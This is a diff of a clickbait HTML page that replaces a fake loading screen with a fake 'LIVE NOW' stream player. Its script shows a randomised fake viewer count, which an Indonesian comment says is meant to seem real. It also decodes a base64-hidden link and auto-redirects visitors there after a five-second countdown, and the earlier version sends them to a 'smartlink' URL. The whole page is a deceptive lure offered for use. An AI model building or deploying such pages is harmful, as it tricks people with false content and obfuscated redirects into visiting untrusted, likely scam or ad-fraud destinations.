@@ -1,120 +1,167 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Preparing...</title>
+<meta charset="UTF-8">
 
-  <!-- ========== OG PREVIEW ========== -->
-  <meta property="og:title" content="🎁 SOMETHING UNEXPECTED IS WAITING">
-  <meta property="og:description" content="Don't Miss What Waiting Inside,▶️ Click View">
-  <meta property="og:image" content="https://i.imgur.com/eYbBuux.jpeg">
-  <meta property="og:image:width" content="1200">
-  <meta property="og:image:height" content="630">
-  <meta property="og:type" content="website">
-  
+<!-- ================== EDIT ================== -->
+<meta property="og:url" content="https://loading-view.vercel.app/">
+<meta property="og:title" content="🔴 LIVE NOW - Join Before It Ends">
+<meta property="og:description" content="Live session is running. Tap to watch now.">
+<meta property="og:image" content="https://i.imgur.com/eYbBuux.jpeg">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Live Stream</title>
+<!-- ========================================== -->
 
-  <style>
-    body {
-      margin: 0;
-      background: #0f0f0f;
-      color: white;
-      font-family: Arial, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      flex-direction: column;
-    }
+<style>
+body {
+  margin: 0;
+  background: black;
+  font-family: Arial;
+  color: white;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+}
 
-    .loader {
-      width: 50px;
-      height: 50px;
-      border: 5px solid #333;
-      border-top: 5px solid #00ffcc;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin-bottom: 25px;
-    }
+/* VIDEO CARD */
+.player {
+  width: 90%;
+  max-width: 360px;
+  background: #111;
+  border-radius: 16px;
+  overflow: hidden;
+  box-shadow: 0 0 25px rgba(0,0,0,0.8);
+}
 
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
+/* THUMBNAIL */
+.thumb {
+  position: relative;
+}
 
-    h2 {
-      margin: 0;
-      font-size: 20px;
-      margin-bottom: 10px;
-    }
+.thumb img {
+  width: 100%;
+  display: block;
+}
 
-    .progress-bar {
-      width: 220px;
-      height: 6px;
-      background: #222;
-      border-radius: 10px;
-      overflow: hidden;
-      margin-top: 10px;
-    }
+/* LIVE BADGE */
+.live {
+  position: absolute;
+  top: 10px;
+  left: 10px;
+  background: red;
+  padding: 4px 8px;
+  font-size: 12px;
+  border-radius: 6px;
+  font-weight: bold;
+}
 
-    .progress {
-      height: 100%;
-      width: 0%;
-      background: #00ffcc;
-      transition: width 0.3s ease;
-    }
+/* VIEWERS */
+.viewers {
+  position: absolute;
+  bottom: 10px;
+  left: 10px;
+  font-size: 12px;
+  background: rgba(0,0,0,0.6);
+  padding: 4px 8px;
+  border-radius: 6px;
+}
 
-    p {
-      font-size: 13px;
-      opacity: 0.6;
-      margin-top: 8px;
-    }
-  </style>
+/* PLAY BUTTON */
+.play {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  font-size: 40px;
+  background: rgba(0,0,0,0.6);
+  border-radius: 50%;
+  padding: 10px 15px;
+}
 
+/* INFO */
+.info {
+  padding: 15px;
+  text-align: center;
+}
+
+.btn {
+  margin-top: 10px;
+  background: #00ffcc;
+  color: black;
+  border: none;
+  padding: 12px;
+  width: 100%;
+  border-radius: 10px;
+  font-weight: bold;
+  cursor: pointer;
+}
+
+.count {
+  font-size: 13px;
+  opacity: 0.6;
+  margin-top: 8px;
+}
+</style>
 </head>
 
 <body>
 
-  <div class="loader"></div>
+<div class="player">
 
-  <h2 id="status">Preparing your content...</h2>
+  <div class="thumb">
+    <img src="https://i.imgur.com/eYbBuux.jpeg">
 
-  <div class="progress-bar">
-    <div class="progress" id="progress"></div>
+    <div class="live">LIVE</div>
+    <div class="viewers" id="viewer">👁 1,284 watching</div>
+    <div class="play">▶</div>
   </div>
 
-  <p>Please wait a moment</p>
+  <div class="info">
+    <b>Live Stream Starting...</b>
 
-  <script>
-    let progress = 0;
-    let progressBar = document.getElementById("progress");
-    let statusText = document.getElementById("status");
+    <button class="btn" onclick="go()">▶ Watch Now</button>
 
-    let interval = setInterval(() => {
-      progress += Math.random() * 15; // biar keliatan natural
-      if (progress > 100) progress = 100;
+    <div class="count">
+      Auto opening in <span id="time">5</span>s...
+    </div>
+  </div>
 
-      progressBar.style.width = progress + "%";
+</div>
 
-      // ubah teks biar lebih realistis
-      if (progress < 30) {
-        statusText.innerText = "Preparing your content...";
-      } else if (progress < 60) {
-        statusText.innerText = "Connecting to server...";
-      } else if (progress < 90) {
-        statusText.innerText = "Almost ready...";
-      } else {
-        statusText.innerText = "Launching...";
-      }
+<script>
 
-      if (progress >= 100) {
-        clearInterval(interval);
+// ===== EDIT LINK =====
+let encoded = "aHR0cHM6Ly9mZGVkZGcuaHVic3Mub25lL3AvbmhWTnk=";
+let target = atob(encoded);
+// =====================
 
-        // redirect ke smartlink
-        window.location.href = "https://fdeddg.hubss.one/p/nhVNy";
-      }
+// fake viewer naik turun biar real
+setInterval(()=>{
+  let v = Math.floor(1000 + Math.random()*500);
+  document.getElementById("viewer").innerText = "👁 " + v + " watching";
+},2000);
 
-    }, 300); // smooth speed
-  </script>
+// countdown
+let t = 5;
+let el = document.getElementById("time");
+
+let timer = setInterval(()=>{
+  t--;
+  el.innerText = t;
+
+  if(t <= 0){
+    clearInterval(timer);
+    window.location.href = target;
+  }
+},1000);
+
+// klik
+function go(){
+  window.location.href = target;
+}
+
+</script>
 
 </body>
 </html>
